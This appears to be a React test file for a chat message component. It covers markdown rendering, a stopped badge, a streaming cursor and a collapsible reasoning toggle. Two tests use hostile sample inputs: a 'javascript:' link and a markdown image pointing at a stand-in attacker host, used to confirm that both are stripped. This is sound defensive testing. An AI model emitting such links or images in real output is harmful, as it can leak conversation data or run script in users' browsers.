import { render, screen, within } from "@testing-library/react";
import userEvent from "@testing-library/user-event";
import type { ReasoningUIPart, UIMessage } from "ai";
import { describe, expect, it } from "vitest";
import { MessageBubble } from "@/components/MessageBubble";

function makeMessage(role: UIMessage["role"], text: string): UIMessage {
	return {
		id: `${role}-${Math.random()}`,
		role,
		parts: [{ type: "text", text }],
	};
}

function makeAssistantWithReasoning(
	text: string,
	reasoningParts: ReasoningUIPart[],
): UIMessage {
	return {
		id: `assistant-${Math.random()}`,
		role: "assistant",
		parts: [...reasoningParts, { type: "text", text }],
	};
}

describe("MessageBubble", () => {
	it("renders the user message as plain text without parsing markdown", () => {
		render(<MessageBubble message={makeMessage("user", "**not bold**")} />);

		const bubble = screen.getByText("**not bold**");
		expect(bubble).toBeVisible();
		expect(bubble.querySelector("strong")).toBeNull();
	});

	it("renders the assistant message with markdown formatting", () => {
		const markdown = [
			"Here is **bold** and *italic*:",
			"",
			"- alpha",
			"- beta",
		].join("\n");
		render(<MessageBubble message={makeMessage("assistant", markdown)} />);

		const bubble = screen
			.getByText(/Here is/)
			.closest("[data-role='assistant']");
		expect(bubble).not.toBeNull();
		const scope = within(bubble as HTMLElement);
		expect(scope.getByText("bold").tagName).toBe("STRONG");
		expect(scope.getByText("italic").tagName).toBe("EM");
		const items = scope.getAllByRole("listitem").map((li) => li.textContent);
		expect(items).toEqual(["alpha", "beta"]);
	});

	it("strips dangerous link protocols from assistant markdown", () => {
		const markdown = [
			"[click me](javascript:alert(1))",
			"",
			"[safe](https://example.com)",
		].join("\n");
		const { container } = render(
			<MessageBubble message={makeMessage("assistant", markdown)} />,
		);

		expect(container.querySelector('a[href^="javascript:" i]')).toBeNull();
		const dangerous = screen.getByText(/click me/);
		expect(dangerous.closest("a")).toBeNull();

		const safe = screen.getByText("safe").closest("a");
		expect(safe?.getAttribute("href")).toMatch(/^https:\/\/example\.com/);
	});

	it("drops image tags from assistant markdown to block exfiltration pixels", () => {
		const markdown = [
			"![leak](https://attacker.example/leak?conv=secret)",
			"",
			"plain text after",
		].join("\n");
		const { container } = render(
			<MessageBubble message={makeMessage("assistant", markdown)} />,
		);

		expect(container.querySelector("img")).toBeNull();
		expect(screen.getByText("plain text after")).toBeVisible();
	});

	it("renders the muted stopped chip when stopped is true on an assistant message", () => {
		render(
			<MessageBubble
				message={makeMessage("assistant", "partial reply")}
				stopped
			/>,
		);

		const badge = screen.getByTestId("stopped-badge");
		expect(badge).toBeVisible();
		expect(badge).toHaveTextContent("Stopped");
		expect(badge.className).toMatch(/bg-muted/);
		expect(badge.className).toMatch(/text-muted-foreground/);
	});

	it("does not render the stopped chip when stopped is false or omitted", () => {
		render(
			<MessageBubble message={makeMessage("assistant", "complete reply")} />,
		);
		expect(screen.queryByTestId("stopped-badge")).not.toBeInTheDocument();
	});

	it("renders a pulsing cursor only when showCursor is set", () => {
		const { rerender } = render(
			<MessageBubble
				message={makeMessage("assistant", "thinking…")}
				showCursor
			/>,
		);
		expect(screen.getByTestId("streaming-cursor")).toBeInTheDocument();

		rerender(<MessageBubble message={makeMessage("assistant", "thinking…")} />);
		expect(screen.queryByTestId("streaming-cursor")).not.toBeInTheDocument();
	});

	describe("reasoning disclosure", () => {
		it("renders a Thinking toggle for each reasoning part", () => {
			const message = makeAssistantWithReasoning("final answer", [
				{ type: "reasoning", text: "step one", state: "done" },
			]);
			render(<MessageBubble message={message} />);

			expect(
				screen.getByRole("button", { name: /thinking/i }),
			).toBeInTheDocument();
		});

		it("starts collapsed when reasoning state is done (persisted replay)", () => {
			const message = makeAssistantWithReasoning("answer", [
				{ type: "reasoning", text: "some thought", state: "done" },
			]);
			render(<MessageBubble message={message} />);

			const toggle = screen.getByRole("button", { name: /thinking/i });
			expect(toggle).toHaveAttribute("aria-expanded", "false");
			expect(screen.queryByText("some thought")).not.toBeInTheDocument();
		});

		it("starts expanded while streaming", () => {
			const message = makeAssistantWithReasoning("", [
				{
					type: "reasoning",
					text: "reasoning in progress",
					state: "streaming",
				},
			]);
			render(<MessageBubble message={message} />);

			const toggle = screen.getByRole("button", { name: /thinking/i });
			expect(toggle).toHaveAttribute("aria-expanded", "true");
			expect(screen.getByText("reasoning in progress")).toBeVisible();
		});

		it("toggling the button reveals and hides the reasoning text", async () => {
			const user = userEvent.setup();
			const message = makeAssistantWithReasoning("answer", [
				{ type: "reasoning", text: "hidden thought", state: "done" },
			]);
			render(<MessageBubble message={message} />);

			const toggle = screen.getByRole("button", { name: /thinking/i });
			expect(screen.queryByText("hidden thought")).not.toBeInTheDocument();

			await user.click(toggle);
			expect(screen.getByText("hidden thought")).toBeVisible();

			await user.click(toggle);
			expect(screen.queryByText("hidden thought")).not.toBeInTheDocument();
		});

		it("does not render any Thinking toggle when there are no reasoning parts", () => {
			render(
				<MessageBubble message={makeMessage("assistant", "plain reply")} />,
			);
			expect(
				screen.queryByRole("button", { name: /thinking/i }),
			).not.toBeInTheDocument();
		});
	});
});
